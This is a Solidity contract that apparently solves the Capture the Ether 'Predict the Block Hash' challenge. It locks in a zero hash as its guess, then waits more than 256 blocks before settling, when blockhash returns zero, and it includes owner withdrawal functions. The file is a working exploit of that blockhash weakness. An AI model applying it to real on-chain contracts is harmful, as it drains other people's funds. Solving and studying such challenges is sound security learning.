//SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

interface PredictTheBlockHashChallenge {
    function isComplete() external returns (bool);

    function lockInGuess(bytes32) external payable;

    function settle() external;
}

contract PredictTheBlockHashChallengeCall {
    //uint8 public answer;
    bytes32 public luckanswer;
    address public owner;
    uint256 public settlementBlockNumber;
    PredictTheBlockHashChallenge public _interface;

    constructor(address addr) {
        require(addr != address(0), "Address can not be Zero");
        _interface = PredictTheBlockHashChallenge(addr);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "you are not owner!");
        _;
    }

    //function callFuct(address addr) public payable {
    function calllockInGuess() public payable {
        _interface.lockInGuess{value: 1 ether}(luckanswer);
        settlementBlockNumber = block.number + 1;
    }

    function getZeroblockhash() public {
        luckanswer = blockhash(12113041);
    }

    function callsettle() public {
        //uint8 answer = (uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10);
        require(
            block.number >= (settlementBlockNumber + 258),
            "need wait block number.."
        );
        _interface.settle();
    }

    function withdraw(address payable _to) public payable onlyOwner {
        _to.transfer(address(this).balance);
    }

    function deposit() public payable {}

    receive() external payable {}
}
